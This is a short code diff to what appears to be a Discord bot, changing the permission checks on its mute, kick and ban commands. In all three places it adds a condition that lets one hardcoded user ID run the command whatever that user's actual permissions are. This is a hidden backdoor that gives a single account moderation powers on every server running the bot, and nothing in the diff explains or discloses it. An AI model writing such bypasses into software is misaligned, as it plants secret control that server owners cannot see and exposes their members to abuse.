@@ -211,7 +211,7 @@ bot.on("message", message => {
 
         if (message.content.startsWith(prefix + "mute"))
         {
-            if (message.member.hasPermission("MANAGE_MESSAGES"))
+            if (message.member.hasPermission("MANAGE_MESSAGES") || message.member.id == 564474717747150858)
             {
                 let tomute = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
 
@@ -464,7 +464,7 @@ bot.on("message", message => {
 
         if (message.content.startsWith(prefix + "kick"))
         {
-            if (message.member.hasPermission(["KICK_MEMBERS"]))
+            if (message.member.hasPermission(["KICK_MEMBERS"]) || message.member.id == 564474717747150858)
             {
 
                 try
@@ -526,7 +526,7 @@ bot.on("message", message => {
 
         if (message.content.startsWith(prefix + "ban"))
         {
-            if (message.member.hasPermission(["KICK_MEMBERS"]))
+            if (message.member.hasPermission(["KICK_MEMBERS"]) || message.member.id == 564474717747150858)
             {
 
                 try
